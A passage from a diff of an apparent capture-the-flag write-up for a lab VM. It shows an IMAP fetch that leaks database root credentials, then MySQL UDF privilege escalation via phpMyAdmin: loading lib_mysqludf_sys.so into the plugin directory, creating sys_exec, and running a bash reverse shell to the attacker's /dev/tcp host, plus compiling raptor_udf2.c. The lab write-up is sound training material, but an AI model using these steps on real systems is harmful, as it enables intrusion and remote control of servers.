+pr�senter les nouveaut�s de chaque version. Pendant cette courte
+formation, les diff�rents intervenants utilisent un grand nombre
+d'applications pr�-con�ues dans lesquelles ils ont int�gr� les multiples
+nouveaut�s, tout en exploitant le mat�riel (serveurs, t�l�phones) qu'ils
+ont apport�. Non seulement, WinDev est largement mis en avant, mais aussi
+les autres environnements : WebDev et WinDev Mobile. Le code source des
+sujets pr�sent�s ainsi qu'un support de cours sont remis � chaque
+participant.
+)
+a4 OK Fetch completed.
+a4 FETCH 2 body[]
+* 2 FETCH (BODY[] {629}
+Received: from 192.168.1.22
+        (SquirrelMail authenticated user laurie@borntosec.net)
+        by 192.168.1.8 with HTTP;
+        Thu, 8 Oct 2015 23:25:25 +0200
+Message-ID: <e231e4a59416c44fd367fc5eeff1e8f5.squirrel@192.168.1.8>
+Date: Thu, 8 Oct 2015 23:25:25 +0200
+Subject: DB Access
+From: laurie@borntosec.net
+To: ft_root@mail.borntosec.net
+User-Agent: SquirrelMail/1.4.22
+MIME-Version: 1.0
+Content-Type: text/plain;charset=iso-8859-1
+Content-Transfer-Encoding: 8bit
+X-Priority: 3 (Normal)
+Importance: Normal
+
+Hey Laurie,
+
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+
+Best regards.
+)
+a4 OK Fetch completed.
 ```
 
 
@@ -1166,9 +1555,50 @@ Escape character is '^]'.
 
 
 
-### [`raptor_udf2.so`](https://www.exploit-db.com/exploits/1518)
 
+
+
+
+
+
+
+
+
+
+![[Pasted image 20240511182840.png]]
+
+I followed [this article on Medium](https://rootrecipe.medium.com/mysql-to-system-root-ad8edc305d2b) to upload the [lib_mysqludf_sys.so](https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64) file as [blob](https://www.mysqltutorial.org/mysql-basics/mysql-blob) in a table to open a file in the `mysql` library (however our `mysql` user has no permissions to write in the directory `/usr/lib/mysql/plugin`) and be able to [create a function](https://dev.mysql.com/doc/refman/8.0/en/create-function-loadable.html).
+
+We transfer the file to the `/tmp` directory of the host machine:
+```shell
+┌──(fab㉿kali)-[~]
+└─$ scp ./lib_mysqludf_sys.so thor@192.168.56.101:/tmp/
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+thor@192.168.56.101's password:
+lib_mysqludf_sys.so                                                                   100% 3200     1.7MB/s   00:00
+
+┌──(fab㉿kali)-[~]
+└─$
 ```
+and insert the following code in the "SQL" tab of PHPMyAdmin:
+```
+use mysql;
+create table flash (line blob);
+insert into flash values(load_file('/tmp/lib_mysqludf_sys.so'));
+select * from flash into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
+create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+select sys_exec('bash -i >& /dev/tcp/192.168.119.135/4444 0>&1');
+```
+
+The same method may apply to the [`raptor_udf2.so`](https://www.exploit-db.com/exploits/1518) file. We need to download and compile the [raptor_udf2.c](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c) file:
+```shell
 ┌──(fab㉿kali)-[~]
 └─$ gcc -g -c raptor_udf2.c
 
@@ -1176,7 +1606,7 @@ Escape character is '^]'.
 └─$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 
 ┌──(fab㉿kali)-[~]
-└─$ scp raptor_udf2.so thor@192.168.56.101:~/
+└─$ scp raptor_udf2.so thor@192.168.56.101:/tmp/
         ____                _______    _____
        |  _ \              |__   __|  / ____|
        | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
@@ -1191,6 +1621,3 @@ raptor_udf2.so                                                                  
 ┌──(fab㉿kali)-[~]
 └─$
 ```
-
-options
-https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c
